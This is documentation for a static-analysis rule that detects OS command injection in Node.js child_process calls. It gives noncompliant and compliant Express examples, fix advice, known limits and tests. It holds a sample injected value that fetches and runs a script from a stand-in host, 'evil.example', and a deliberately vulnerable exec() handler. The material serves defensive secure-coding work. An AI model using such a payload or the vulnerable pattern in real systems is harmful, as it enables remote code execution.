# OS command built from HTTP request data (Node.js)

`qualor:js/command-injection` · Issue · Severity: High · [CWE-78](https://cwe.mitre.org/data/definitions/78.html) · OWASP Top 10: [A05:2025 Injection](https://top10.owasp.org/2025/A05_2025-Injection/), [A03:2021 Injection](https://top10.owasp.org/2021/A03_2021-Injection/)

## What it finds

<!-- begin: what-it-finds -->
HTTP request data that reaches an operating-system command through `child_process` (Express,
Fastify, Next.js):

- the command of `exec()` and `execSync()`, which a shell runs;
- the program of `execFile()`, `spawn()`, `fork()` and their `Sync` forms;
- the arguments of `execFile()` and `spawn()` when the `shell` option is set;
- the command given to a shell program: the element after `sh -c` (or `bash -lc`, ...); every
  element after `cmd.exe /c` or `/k`; for PowerShell (`pwsh`, `powershell.exe`), every element
  after `-Command`, the command after `-CommandWithArgs` or `-EncodedCommand`, and the script
  after `-File`.
<!-- end: what-it-finds -->

## Why it matters

<!-- begin: why-it-matters -->
A shell reads its command line as code. A value such as `main; curl evil.example | sh` starts
commands of the client's choosing with the rights of the server process. Letting the request
choose the program has the same effect without any shell syntax.
<!-- end: why-it-matters -->

## Example

<!-- begin: example -->
**Noncompliant:** the branch name is pasted into a shell command.

```javascript
const express = require('express');
const { exec } = require('child_process');

const app = express();

app.get('/log', (req, res) => {
  exec('git log --oneline ' + req.query.ref, (err, stdout) => {
    res.json({ log: stdout });
  });
});
```

**Compliant:** a fixed program with an argument array and no shell.

```javascript
const express = require('express');
const { execFile } = require('child_process');

const app = express();

app.get('/log', (req, res) => {
  execFile('git', ['log', '--oneline', req.query.ref], (err, stdout) => {
    res.json({ log: stdout });
  });
});
```
<!-- end: example -->

## How to fix

<!-- begin: how-to-fix -->
- Run a fixed program with an argument array and no shell: `execFile('git', ['log', ref])` or
  `spawn('convert', [input, output])`. Each array element reaches the program as one argument.
- Do not use `exec()`, `execSync()` or `shell: true` with request data.
- Check values against an allow-list where you can, and make sure a value cannot start with `-`
  where the program would read it as an option.
<!-- end: how-to-fix -->

## Frameworks and APIs covered

- Express
- Next.js
- Fastify
- Node.js child_process

## Known limits

<!-- begin: known-limits -->
- The `shell` option is recognised only in an options object written in the call; options built
  before the call (`const options = { shell: true }`) are not followed.
- An allow-list check before the call (`if (!TOOLS.includes(x)) return`) is not recognised; an
  allow-list that yields constants (a ternary, or a lookup in a `const` table with literal keys and
  values) is. A lookup with a fallback to request data (`TOOLS[k] || req.query.tool`,
  `TOOLS.get(k) ?? req.body.tool`) is no allow-list and is reported.
- A shell's script is followed when the argument array is written in the call
  (`spawn('sh', ['-c', cmd])`), not when it is built before.
- PowerShell parameters are recognised by the names its documentation lists (`-Command`/`-c`,
  `-CommandWithArgs`/`-cwa`, `-EncodedCommand`/`-e`/`-ec`, `-File`/`-f`, in any case); other
  shortened names (`-Comm`, `-enc`) are not. Request data after `-File` and its script is a
  parameter of the script, and is not reported.
- `child_process` functions are recognised through `require()` and `import`, destructured or not,
  and `util.promisify()`; renamed imports (`exec as run`) are not.
- Request handlers are recognised by the name of their second parameter (`res`, `reply`, `ctx`,
  `next`, ...): a handler written as `(request, out)` is not checked.
<!-- end: known-limits -->

## Tests

The test files [`rules/js/command/command-injection.js`](../../../rules/js/command/command-injection.js) and [`rules/js/command/command-injection.ts`](../../../rules/js/command/command-injection.ts) hold every case the rule reports or accepts:
lines marked `ruleid:` must be reported and lines marked `ok:` must not. The known limits are
marked `todoruleid:` (missed) and `todook:` (wrongly reported). `npm test` runs them with OpenGrep,
and checks the example above as well.

The rule: [`rules/js/command/command-injection.yml`](../../../rules/js/command/command-injection.yml), added in version 2026.10.1.
